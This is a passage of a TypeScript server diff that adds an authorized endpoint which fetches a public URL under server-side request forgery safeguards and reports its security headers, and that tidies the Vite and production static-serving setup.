+    if (!requireAuthorized(req, res)) return;
+    if (!isNonEmptyString(req.body?.url, 2_000)) return res.status(400).json({ error: "A URL is required." });
+    let target: URL;
+    try {
+      target = new URL(req.body.url.trim());
+    } catch {
+      return res.status(400).json({ error: "Provide a valid HTTP or HTTPS URL." });
+    }
+    if (!/^https?:$/.test(target.protocol) || target.username || target.password || (target.port && target.port !== "80" && target.port !== "443")) return res.status(400).json({ error: "Only public HTTP(S) URLs without credentials or custom ports are allowed." });
+    try {
+      await assertPublicHostname(target.hostname);
+      const response = await fetch(target, { redirect: "manual", signal: AbortSignal.timeout(8_000), headers: { Accept: "text/html,application/xhtml+xml", "User-Agent": "FKRH-Defensive-Header-Audit/1.0" } });
+      const result: HeaderAuditResult = {
+        url: target.toString(),
+        statusCode: response.status,
+        statusText: response.statusText,
+        securityHeaders: {
+          strictTransportSecurity: safeHeaderValue(response.headers.get("strict-transport-security")),
+          contentSecurityPolicy: safeHeaderValue(response.headers.get("content-security-policy")),
+          xFrameOptions: safeHeaderValue(response.headers.get("x-frame-options")),
+          xContentTypeOptions: safeHeaderValue(response.headers.get("x-content-type-options")),
+          referrerPolicy: safeHeaderValue(response.headers.get("referrer-policy")),
+          permissionsPolicy: safeHeaderValue(response.headers.get("permissions-policy")),
+        },
+        timestamp: now(),
+      };
+      return res.json(result);
+    } catch (error) {
+      return errorResponse(error, res);
+    }
+  });
+
   if (process.env.NODE_ENV !== "production") {
-    const vite = await createViteServer({
-      server: { middlewareMode: true },
-      appType: "spa",
-    });
+    const vite = await createViteServer({ server: { middlewareMode: true }, appType: "spa" });
     app.use(vite.middlewares);
   } else {
-    const distPath = path.join(process.cwd(), 'dist');
-    app.use(express.static(distPath));
-    app.get('*', (req, res) => {
-      res.sendFile(path.join(distPath, 'index.html'));
+    const distPath = path.join(ROOT_DIR, "dist");
+    if (!existsSync(path.join(distPath, "index.html"))) throw new Error("Production build not found. Run npm run build first.");
+    app.use(express.static(distPath, { index: "index.html" }));
+    app.use((req, res, next) => {
+      if (req.method !== "GET" && req.method !== "HEAD") return next();
+      return res.sendFile(path.join(distPath, "index.html"));
     });
   }
 
-  server.listen(PORT, "0.0.0.0", () => {
-    console.log(`Server running on http://localhost:${PORT}`);
-  });
+  httpServer.listen(PORT, HOST, () => console.log(`FKRH defensive dashboard listening on http://${HOST}:${PORT}`));
 }
 
-startServer();
+startServer().catch((error) => {
+  console.error(error);
+  process.exitCode = 1;
+});
